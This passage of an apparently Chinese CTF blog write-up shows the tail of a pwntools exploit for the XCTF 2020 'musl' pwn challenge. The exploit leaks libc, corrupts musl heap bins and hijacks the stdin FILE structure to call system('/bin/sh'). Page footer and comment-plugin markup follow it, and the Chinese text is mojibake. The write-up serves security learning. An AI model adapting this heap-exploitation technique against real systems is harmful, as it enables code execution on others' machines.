content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What is your sleeve ID? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What is your sleeve ID? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">create(<span class="number">0x1</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">b&#x27;Done.&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x29de61</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base=&gt;&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">bin_addr = libc_base + <span class="number">0x29de00</span> - <span class="number">0x8</span></span><br><span class="line">stdin_addr = libc_base + libc.symbols[<span class="string">&#x27;__stdin_FILE&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binmap_addr = libc_base + <span class="number">0x29da80</span></span><br><span class="line">brk_addr = libc_base + libc.symbols[<span class="string">&#x27;brk&#x27;</span>]</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 3</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 4</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 5</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 6</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 7</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>) + p64(<span class="number">0x20</span>) + p64(stdin_addr -</span><br><span class="line">                                       <span class="number">0x10</span>) + p64(stdin_addr -</span><br><span class="line">                                                   <span class="number">0x10</span>) + p8(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;Y&#x27;</span>, payload + <span class="string">b&#x27;\n&#x27;</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(stdin_addr - <span class="number">0x10</span>, bin_addr))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 5</span></span><br><span class="line">file_struct = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">file_struct += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">1</span>) * <span class="number">2</span> + p64(system_addr)</span><br><span class="line">create(<span class="number">0x50</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)  <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(brk_addr - <span class="number">0x10</span>, brk_addr - <span class="number">0x10</span>))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(binmap_addr - <span class="number">0x10</span>, binmap_addr - <span class="number">0x10</span>))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(binmap_addr - <span class="number">0x10</span>, bin_addr))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 7</span></span><br><span class="line">create(<span class="number">0x50</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)  <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(brk_addr - <span class="number">0x10</span>, bin_addr))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x50</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)  <span class="comment"># 11</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>, file_struct)</span><br><span class="line">edit(<span class="number">11</span>, p64(<span class="number">0xbadbeef</span> - <span class="number">0x20</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">10</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">r.sendlien(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;What is your prefer size? &gt;&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±æ˜¯æˆ‘è¿™é‡Œçš„libcæ˜¯è‡ªå·±ç¼–è¯‘çš„å’Œé¢˜ç›®ä¸€ç›´æœ‰å‡ºå…¥ï¼Œæ‰€ä»¥æˆ‘è¿™ä¸ªexpå¯èƒ½ä¸èƒ½ç›´æ¥ç”¨åœ¨é¢˜ç›®ä¸Šï¼ŒåŒæ—¶æˆ‘ä¹Ÿé—®äº†å…¶ä»–å¸ˆå‚…è¿™ä¸ªç¼–è¯‘è¯¥æ€ä¹ˆåŠï¼Œè¿˜åœ¨ç­‰å›å¤~</p>
<hr>
<p>å‚è€ƒé“¾æ¥ï¼š<a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202253%23h2-4#h3-14" >https://www.anquanke.com/post/id/202253%23h2-4#h3-14<i class="fas fa-external-link-alt"></i></a></p>

                    
                </div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                            <ul class="post-tags-box border-box">
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/musl/">musl</a>
                                    </li>
                                
                            </ul>
                        
                    </div>
                    <div>
                        
                    </div>
                </div>

                
                    

<div class="reward-author-container border-box flex-center">
    <div class="reward-btn border-box flex-center tooltip tooltip-img"
            data-tooltip-img-url="/images/reward.jpg"
            data-tooltip-img-trigger="click"
            data-tooltip-img-style="top: -6px;"
    >
        <i class="fa-solid fa-mug-hot"></i>&nbsp;æ¿€åŠ±ç‰›é©¬ï¼ŒåŠ é€Ÿåˆ›ä½œï¼
    </div>
</div>

                

                
                    <div class="post-nav border-box">
                        
                            <div class="prev-post">
                                <a class="prev"
                                   rel="prev"
                                   href="/2022/05/10/musl1-2-2%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-starCTF-BabyNote%E5%A4%8D%E7%8E%B0/"
                                   title="musl1.2.2æºç åˆ†æ+starCTF-BabyNoteå¤ç°"
                                >
                                    <span class="left arrow-icon flex-center">
                                        <i class="fas fa-chevron-left"></i>
                                    </span>
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">musl1.2.2æºç åˆ†æ+starCTF-BabyNoteå¤ç°</span>
                                        <span class="post-nav-item">ä¸Šä¸€ç¯‡</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="next-post">
                                <a class="next"
                                   rel="next"
                                   href="/2022/04/17/CTF-examination/"
                                   title="*CTF-examination"
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">*CTF-examination</span>
                                        <span class="post-nav-item">ä¸‹ä¸€ç¯‡</span>
                                    </span>
                                    <span class="right arrow-icon flex-center">
                                        <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    


    <div class="comments-container border-box">
        <div id="comments-anchor" class="comment-area-title border-box">
            <i class="fas fa-comments"></i>&nbsp;è¯„è®º
        </div>
        <div class="comment-plugin-fail border-box">
    <span class="fail-tip">è¯„è®ºæ’ä»¶åŠ è½½å¤±è´¥</span>
    <button class="reload keep-button">ç‚¹å‡»é‡æ–°åŠ è½½</button>
</div>
<div class="comment-plugin-loading flex-center border-box">
    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
    <span class="load-tip">æ­£åœ¨åŠ è½½è¯„è®ºæ’ä»¶</span>
</div>
<script data-pjax>
  window.KeepCommentPlugin = {}
  window.KeepCommentPlugin.hideLoading = () => {
    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
    cplDom.style.display = 'none'
  }
  window.KeepCommentPlugin.loadFailHandle = () => {
    window.KeepCommentPlugin.hideLoading()
    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
    cpfDom.style.display = 'flex'
    cpfDom.querySelector('.reload').addEventListener('click', () => {
      window.location.reload()
    })
  }
</script>

        
            

    <div class="valine-container">
        <div id="vcomments"></div>
        <script 
                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"
                async
                onerror="window.KeepCommentPlugin.loadFailHandle()"
        ></script>
        <script 
                async
                onerror="window.KeepCommentPlugin.loadFailHandle()"
        >
          window.KeepCommentPlugin.initValine = () => {
            const config = {
              el: '#vcomments',
              appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
              appKey: 'C672AAYGXMkHxztf8ntdLShs',
              meta: ['nick', 'mail', 'link'],
              avatar: 'wavatar',
              enableQQ: true,
              placeholder: 'ğŸ˜œè‹¥æœ‰é—®é¢˜è¯·å„ä½å¤§å¸ˆå‚…ç•™è¨€è¯„è®º',
              lang: 'zh-CN'.toLowerCase()
            }

            if ('') {
              config.serverURLs = ''
            }

            if (window?.Valine) {
              new Valine(config)
              window.KeepCommentPlugin.hideLoading()
            } else {
              setTimeout(() => {
                window.KeepCommentPlugin.initValine()
              }, 1000)
            }
          }

          if ('false' === 'true') {
            setTimeout(() => {
              window.KeepCommentPlugin.initValine()
            }, 1200)
          } else {
            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initValine)
          }
        </script>
    </div>


        
    </div>





                
            </div>
        </div>

        
            <div class="pc-post-toc right-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#musl-1-1-24"><span class="nav-text">musl 1.1.24</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="nav-text">æ•°æ®ç»“æ„</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc"><span class="nav-text">malloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#free"><span class="nav-text">free</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XCTF-2020-PWN-musl"><span class="nav-text">XCTF_2020_PWN_musl</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-text">é¢˜ç›®åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">åˆ©ç”¨åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="copyright-info info-item">
        &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2024
        
            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">196082</a>
        
    </div>

    <div class="theme-info info-item">
        ç”±&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;é©±åŠ¨&nbsp;&&nbsp;ä¸»é¢˜&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
    </div>

    
        
        <div class="deploy-info info-item">
            
            æœ¬ç«™ç”± <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> æä¾›éƒ¨ç½²æœåŠ¡
            
        </div>
    

    
        <div class="count-info info-item">
            
                <span class="count-item border-box word">
                    <span class="item-type border-box">æ€»å­—æ•°</span>
                    <span class="item-value border-box word">335.6k</span>
                </span>
            

            
                <span class="count-item border-box uv">
                    <span class="item-type border-box">è®¿å®¢æ•°</span>
                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
                </span>
            

            
                <span class="count-item border-box pv">
                    <span class="item-type border-box">è®¿é—®é‡</span>
                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
                </span>
            
        </div>
    

    
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="post-tools-list border-box">
        <!-- PC encrypt again -->
        

        <!-- PC TOC show toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- PC go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        

        <!-- PC full screen -->
        <li class="tools-item flex-center full-screen">
            <i class="fa-solid fa-expand"></i>
        </li>
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <!-- toggle mode -->
        
            <li class="tools-item tool-toggle-theme-mode flex-center">
                <i class="fas fa-moon"></i>
            </li>
        

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        <!-- to bottom -->
        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        
            <li class="tools-item toggle-show-toc-tablet flex-center">
                <i class="fas fa-list"></i>
            </li>
        

        
            <li class="tools-item go-to-comments-tablet flex-center">
                <i class="fas fa-comment"></i>
            </li>
        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="æœç´¢..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

    <!-- tablet toc -->
    
        <div class="tablet-post-toc-mask">
            <div class="tablet-post-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#musl-1-1-24"><span class="nav-text">musl 1.1.24</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="nav-text">æ•°æ®ç»“æ„</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc"><span class="nav-text">malloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#free"><span class="nav-text">free</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XCTF-2020-PWN-musl"><span class="nav-text">XCTF_2020_PWN_musl</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-text">é¢˜ç›®åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">åˆ©ç”¨åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        </div>
    
</main>





<!-- common js -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/libs/anime.min.js"></script>

<!-- local search -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/local-search.min.js"></script>


<!-- lazyload -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/lazyload.min.js"></script>


<div class="">
    <!-- home page -->
    

    <!-- post page -->
    
        <!-- post-helper -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/post-helper.min.js"></script>

        <!-- toc -->
        
            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/toc.min.js"></script>
        

        <!-- copyright-info -->
        

        <!-- share -->
        
    

    <!-- categories page -->
    

    <!-- links page -->
    

    <!-- photos page -->
    

    <!-- tools page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



</body>
</html>
